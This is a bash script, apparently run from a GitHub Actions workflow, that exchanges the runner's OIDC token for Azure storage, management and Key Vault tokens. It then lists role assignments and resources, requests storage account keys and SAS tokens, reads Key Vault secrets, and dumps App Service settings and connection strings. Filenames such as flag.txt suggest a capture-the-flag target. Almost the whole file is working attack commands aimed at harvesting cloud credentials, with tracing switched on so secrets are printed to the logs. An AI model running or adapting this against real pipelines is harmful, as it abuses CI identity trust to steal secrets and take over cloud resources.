#!/usr/bin/env bash
set -x

# === OIDC token ===
OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
echo "OIDC len: ${#OIDC}"

# === Try OIDC directly for storage (federated credential exchange) ===
echo "=== OIDC → storage.azure.com ==="
ST1=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC" \
  --data-urlencode "scope=https://storage.azure.com/.default" | tee /dev/stderr | jq -r .access_token)
echo "OIDC→storage len: ${#ST1}"
if [ ${#ST1} -gt 100 ]; then
  echo "=== TRY OIDC STORAGE TOKEN ==="
  for A in sttblappcfgprodx3euoz; do
    curl -s -H "Authorization: Bearer $ST1" -H "x-ms-version: 2021-08-06" "https://$A.blob.core.windows.net/?comp=list"
    for C in config internal; do
      curl -s -H "Authorization: Bearer $ST1" -H "x-ms-version: 2021-08-06" "https://$A.blob.core.windows.net/$C?restype=container&comp=list"
      for B in internal-config.json flag.txt flag secret.txt; do
        echo ">>> $A/$C/$B:"
        curl -s -H "Authorization: Bearer $ST1" -H "x-ms-version: 2021-08-06" "https://$A.blob.core.windows.net/$C/$B"
        echo
      done
    done
  done
fi

# === MGMT token → list ALL role assignments on storage ===
echo "=== MGMT → role assignments ==="
MGMT=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC" \
  --data-urlencode "scope=https://management.azure.com/.default" | jq -r .access_token)
echo "MGMT len: ${#MGMT}"

# List role assignments on storage account
curl -s -H "Authorization: Bearer $MGMT" \
  "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" | jq .

# List ALL resources in sub
echo "=== ALL resources ==="
curl -s -H "Authorization: Bearer $MGMT" \
  "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resources?api-version=2021-04-01" | jq -r '.value[].name'

# === Try listKeys on storage via MGMT ===
echo "=== listKeys ==="
curl -s -X POST -H "Authorization: Bearer $MGMT" -H "Content-Length: 0" \
  "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz/listKeys?api-version=2023-05-01" | jq .

# === Try listAccountSas ===
echo "=== listAccountSas ==="
curl -s -X POST -H "Authorization: Bearer $MGMT" -H "Content-Type: application/json" \
  "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz/listAccountSas?api-version=2023-05-01" \
  -d '{"signedServices":"b","signedResourceTypes":"sco","signedPermission":"rl","signedProtocol":"https","signedStart":"2026-10-01T00:00:00Z","signedExpiry":"2026-12-01T00:00:00Z"}' | jq .

# === KV token → try kv-tbl-sec-x3euoz with OIDC directly ===
echo "=== kv-tbl-sec-x3euoz ==="
KV=$(curl -s -X POST "https://login.microsoftonline.com/$AZURE_TENANT_ID/oauth2/v2.0/token" \
  -d "client_id=$AZURE_CLIENT_ID" -d "grant_type=client_credentials" \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  -d "client_assertion=$OIDC" \
  --data-urlencode "scope=https://vault.azure.net/.default" | jq -r .access_token)
curl -s -H "Authorization: Bearer $KV" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" | jq .

# === App Service config (env vars) via MGMT ===
echo "=== App Service config ==="
curl -s -H "Authorization: Bearer $MGMT" \
  "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites?api-version=2023-12-01" | jq -r '.value[]?.name'

# List app settings (env vars including CONFIG_STORAGE_CONNECTION!)
for APPNAME in app-tbl-storefront-prod; do
  echo "=== $APPNAME settings ==="
  curl -s -X POST -H "Authorization: Bearer $MGMT" -H "Content-Length: 0" \
    "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/$APPNAME/config/appsettings/list?api-version=2023-12-01" | jq .
  echo "=== $APPNAME connection strings ==="
  curl -s -X POST -H "Authorization: Bearer $MGMT" -H "Content-Length: 0" \
    "https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites/$APPNAME/config/connectionstrings/list?api-version=2023-12-01" | jq .
done

echo "=== DONE ==="
